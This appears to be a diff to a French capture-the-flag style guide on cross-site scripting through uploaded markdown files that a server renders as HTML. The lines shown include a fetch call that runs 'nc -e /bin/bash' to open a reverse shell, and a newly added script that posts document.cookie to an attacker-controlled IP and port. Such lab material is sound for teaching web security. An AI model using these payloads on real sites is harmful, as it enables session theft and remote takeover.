@@ -3,7 +3,9 @@
 
 Lors du téléchargement d'un fichier qui peut être traité par le serveur au format HTML, nous devons garder à l'esprit que tout ce qui est traité en HTML est probablement vulnérable à XSS (exécution de javascript).
 
-Le fichier markdown est un fichier d'usage courant principalement dans github avec l'extension ".md" (README) dont le but est de décrire un procéssus, une installation etc... une fois ce fichier soumis au serveur, certains serveurs peuvent procéder comme du HTML avant de le stocker. Là, nous pouvons effectuer du XSS comme suit :
+Le fichier markdown est un fichier d'usage courant principalement dans github avec l'extension ".md" (README) dont le but est de décrire un procéssus, une installation etc... 
+Une fois ce fichier soumis au serveur, certains serveurs peuvent procéder comme du HTML avant de le stocker.
+Là, nous pouvons effectuer du XSS comme suit :
 
 
 
@@ -170,3 +172,11 @@ fetch("http://alert.htb/admin/run?cmd=nc -e /bin/bash TON_IP TON_PORT", { creden
     xhr.send(null)
 </script>
 
+
+<script>
+fetch('http://your_ip:your_port', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
